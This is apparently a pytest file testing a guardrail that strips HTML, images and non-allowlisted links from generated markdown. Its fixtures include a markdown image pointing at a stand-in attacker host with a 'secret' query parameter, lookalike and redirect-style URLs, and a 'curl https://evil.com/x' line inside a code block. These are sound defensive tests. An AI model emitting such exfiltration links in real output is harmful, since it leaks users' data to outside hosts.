"""Markdown/link/image policy (GUARDRAILS.md §7.1, §12.3)."""

from __future__ import annotations

import pytest

from app.guard.markdown_policy import apply, cut, norm_url

CFG = {"stripHtml": True, "removeImages": True, "links": {"allowSourceUrlsOnly": True, "removedText": "[link removed]"}}
SRC = ["https://source.org/page"]


def test_images_removed():
    out, _ = apply("Look ![x](https://evil.com/?q=secret)\n<img src='https://evil.com/a.png'> done", SRC, CFG)
    assert "evil" not in out and "done" in out


def test_html_stripped_but_code_untouched():
    out, _ = apply("<b>bold</b> and `<i>code</i>`\n```\n<script>x</script>\n```", SRC, CFG)
    assert out.startswith("bold and `<i>code</i>`") and "<script>x</script>" in out


@pytest.mark.parametrize(
    "url,allowed",
    [
        ("https://source.org/page", True),
        ("HTTPS://Source.org/page/", True),
        ("https://source.org:443/page#top", True),
        ("https://source.org.evil.com/page", False),
        ("https://evil.com/?u=https://source.org/page", False),
        ("http://source.org/page", False),
    ],
)
def test_link_allowlist(url, allowed):
    out, removed = apply(f"See [the page]({url}).", SRC, CFG)
    assert (url in out) is allowed and removed == (0 if allowed else 1)
    if not allowed:
        assert out == "See the page."


def test_bare_urls():
    out, removed = apply("Read https://source.org/page, not https://evil.com/x.", SRC, CFG)
    assert out == "Read https://source.org/page, not [link removed]." and removed == 1


def test_urls_in_code_untouched():
    out, removed = apply("```\ncurl https://evil.com/x\n```", SRC, CFG)
    assert "https://evil.com/x" in out and removed == 0


def test_norm_url():
    assert norm_url("HTTPS://Example.COM:443/a/#x") == "https://example.com/a"


def test_cut_at_paragraph():
    text = ("word " * 100 + "\n\n") * 5
    out = cut(text, 1200)
    assert len(out) <= 1200 and out.endswith("word")
